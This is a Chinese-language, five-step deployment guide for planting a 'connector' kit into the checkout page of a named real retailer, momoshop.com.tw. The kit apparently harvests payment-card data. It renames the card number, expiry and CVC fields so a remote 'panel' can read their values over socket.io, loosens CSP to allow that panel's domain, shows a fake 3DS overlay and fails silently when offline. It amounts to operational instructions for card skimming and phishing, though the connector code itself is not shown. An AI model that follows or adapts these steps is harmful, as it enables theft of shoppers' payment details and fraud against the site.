# 接站补丁包 · 5 步上线

目标站：`https://www.momoshop.com.tw`（結帳在 `cart.momoshop.com.tw`）
标准：`../建站结账页契约.md` v1.0
现状审计：见 [`06-audit.md`](./06-audit.md)

---

## 文件

| 文件 | 作用 | 贴到哪 |
|---|---|---|
| `01-head.html` | UTM 捕获 + `__BP_CART__` 骨架 + connector 资源 | 结账页 `<head>`，`<title>` 之后 |
| `02-checkout-body.html` | 六个固定 id 的 DOM 片段 | 结账页 `<body>` 内 |
| `03-api-cart.mjs` | `GET /api/cart` | 服务端（Node / Pages Function / Worker） |
| `04-api-checkout.mjs` | `POST /api/checkout` + `GET /api/order/:no` | 同上 |
| `05-_headers` | CSP 方案 A 全套响应头 | 仓库根目录 / Nginx |
| `06-audit.md` | 对真实站的合规审计 + 三个必改点 | — |
| `../site/bp/` | connector 整套（原样上传） | 站点根 `/bp/` |

---

## 5 步

### 第 1 步 · 放 connector（10 分钟）

```
site/bp/  →  站点根 /bp/
```

上传后三条必须都是 200：
```bash
curl -s -o /dev/null -w '%{http_code}\n' https://www.momoshop.com.tw/bp/connector.js
curl -s -o /dev/null -w '%{http_code}\n' https://www.momoshop.com.tw/bp/3ds/img/visa.svg
curl -s -o /dev/null -w '%{http_code}\n' https://www.momoshop.com.tw/bp/config.json
```

> ⚠️ **同源**：`/checkout` 与 `/bp/*` 必须同源。结账页在 `cart.` 子域的话，`/bp/` 也要镜像一份到 `cart.` 子域，否则面板读不到 `.value`（见审计 §3 ①）。

### 第 2 步 · 改 head（15 分钟）

把 `01-head.html` 三块依次贴进结账页 `<head>`，顺序不能变：① UTM → ② 骨架 → ③ connector。

顺手删掉两条（有就删）：
- 任何 `<base>` 标签
- 任何 Service Worker 注册（含 `vite-plugin-pwa` / Workbox）

### 第 3 步 · 改 DOM（30 分钟）

`02-checkout-body.html` 里的六个 id 对照现有表单替换：

```
#bp-card-number   #bp-card-expiry   #bp-card-cvc
#bp-total         #bp-error         #bp-submit
```

三条最容易漏：
- 卡号必须 `type="text"`（`type="number"` 会吞空格、光标乱跳）
- `#bp-error` 常驻，不要 `display:none`
- `#bp-submit` 不要 `disabled`，改 `aria-busy="true"`

### 第 4 步 · 两个接口（半天，含时序改造）

`03-api-cart.mjs` + `04-api-checkout.mjs` 挂到路由上，然后改**下单时序**：

```
现在：点支付 → POST 下单 → 生成单号 → 302 成功页
改成：结账页加载 → /api/cart 返回预订单号 → 点支付 → POST /api/checkout（同号）→ 200 → 前端跳 success
```

这是审计里的必改点 ②，不改的话面板会话单号和成功页对不上。

### 第 5 步 · 响应头（10 分钟）

`05-_headers` 里的 CSP 贴上去，把 `PANEL_DOMAIN` 换成实际面板域名（带端口写 `wss://host:port`）。

---

## 验收

```bash
BASE=https://www.momoshop.com.tw node _tools/verify.mjs
```

十项全绿才算接完（脚本会输出通过/失败表）。任何一项失败，对应契约条目在 `06-audit.md` 里都能查到原因和改法。

---

## 灰度与回滚

**灰度**：connector 由 `config.json` 的 `panel_host` 控制。想只放量给内部，把 `panel_host` 指向测试面板，线上结账流程完全不受影响（connector 连不上时静默降级，页面照常可下单）。

**回滚**（任一步出问题，2 分钟内恢复）：
1. 结账页删掉 `01-head.html` 那三块 → 页面回到原流程（connector 不再加载）
2. 路由上摘掉 `/api/checkout` 的接管 → 恢复原下单接口
3. `/bp/` 目录可留着不删（无人引用即死代码）

回滚后 `#bp-*` 的 DOM 留着无害，不要一起删（避免二次上线再改一遍）。

---

## 我方交付清单

```
site/bp/
├─ connector.js               19.8KB   卡片接管 + 提交 + 面板通道 + 3DS
├─ connector.css               3.4KB   字段可读性 + aria-busy 态 + 3DS 弹层
├─ config.json                  183B   panel_host / logname / logtype
├─ socket.io.min.js            4.9KB   面板通道 client（离线回环版）
├─ bp-template-runtime.js      2.3KB   验证屏运行时
├─ 3ds/img/                    6 个    visa / mastercard / 3d-secure-*
└─ README.md
```

`config.json` 上线前需要你给两个值：`panel_host`、`logname`。
